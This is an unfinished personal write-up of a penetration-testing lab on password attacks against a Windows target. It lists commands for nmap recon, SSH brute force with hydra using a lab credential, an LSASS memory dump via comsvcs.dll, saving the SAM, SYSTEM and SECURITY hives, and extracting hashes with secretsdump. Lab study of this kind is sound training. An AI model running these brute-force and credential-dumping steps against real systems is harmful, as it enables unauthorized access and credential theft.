# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
> ⚠️ IP changes on restart — confirm current IP before starting.
> **Updated:** 2026-04-18 11:03 UTC+8

---

## Assessment Checklist

- [x] Foothold (initial access) — SSH brute force
- [ ] Local enumeration
- [ ] Password attacks (local or remote)
- [ ] Privilege escalation
- [ ] Flag(s)

---

## 1. Recon

### Nmap Scan

```bash
nmap -sC -sV -Pn 10.129.234.116
```

---

## 2. Exploitation

### Initial Access — SSH Brute Force

**Victim:** Betty Jayde (Nexura LLC) — `jbetty / Texas123!@#`

```bash
# Generate usernames from name
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt

# Brute force SSH (use single quotes for special chars: !$@#)
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4

# Connect with valid credentials
ssh jbetty@10.129.234.116
# Password: Texas123!@#
```

---

## 3. Privilege Escalation

### Techniques

```bash
# LSASS dump
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# SAM/SYSTEM dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Crack with secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

## 4. Flags

| Flag | Location | Method |
|------|----------|--------|
| user.txt | | |
| root.txt | | |

---

## Lessons Learned

